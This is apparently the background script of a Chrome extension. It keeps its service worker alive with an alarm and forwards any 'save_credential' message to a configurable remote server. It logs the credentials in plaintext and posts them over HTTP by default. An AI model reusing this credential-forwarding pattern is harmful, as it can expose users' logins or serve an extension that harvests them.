// CHANGE THIS URL for production (e.g., https://yourname.pythonanywhere.com)
const SERVER_URL = "http://localhost";

// Keep-Alive Mechanism
chrome.alarms.create("keepAlive", { periodInMinutes: 1.0 });

chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === "keepAlive") {
        console.log("Keep-Alive: Service Worker is active", new Date().toISOString());
        // Optional: Perform a lightweight task here if needed
    }
});

chrome.runtime.onInstalled.addListener(() => {
    console.log("Extension Installed");
    chrome.alarms.get("keepAlive", (alarm) => {
        if (!alarm) {
            chrome.alarms.create("keepAlive", { periodInMinutes: 1.0 });
        }
    });
});

chrome.runtime.onStartup.addListener(() => {
    console.log("Extension Started");
    chrome.alarms.get("keepAlive", (alarm) => {
        if (!alarm) {
            chrome.alarms.create("keepAlive", { periodInMinutes: 1.0 });
        }
    });
});

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.type === "save_credential") {
        console.log("Received save_credential request", request.data);
        const credentialData = request.data;

        fetch(`${SERVER_URL}/api/extension/credentials/`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(credentialData)
        })
            .then(response => {
                if (response.ok) {
                    console.log("Credential saved successfully.");
                } else {
                    console.error("Failed to save credential:", response.statusText);
                }
            })
            .catch(error => {
                console.error("Error sending credential:", error);
            });

        // Return true to indicate we wish to send a response asynchronously
        return true;
    }
});
